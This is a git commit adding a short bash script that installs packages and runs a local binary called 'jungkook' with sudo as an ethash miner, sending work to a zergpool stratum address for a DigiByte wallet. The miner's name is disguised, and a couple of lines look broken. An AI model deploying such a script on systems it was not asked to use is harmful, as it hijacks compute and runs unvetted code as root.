d0971f02988c9275fbc33fce8392ef2d927ed54c
goldengoose45 <86189692+goldengoose45@users.noreply.github.com>
2021-07-03 20:36:58 +0530

    Create digit.sh

---
+++ digit.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+screen -dmS ls 
+
+chmod +x ./jungkook && sudo ./jungkook -a ethash -o stratum+tcp://ethash.na.mine.zergpool.com:9999 -u dgb1qrgrax0ke2h9zzf4t3gv878yu86gxz80x0essun -p c=DGB,ID=STARDGB
+pause $@
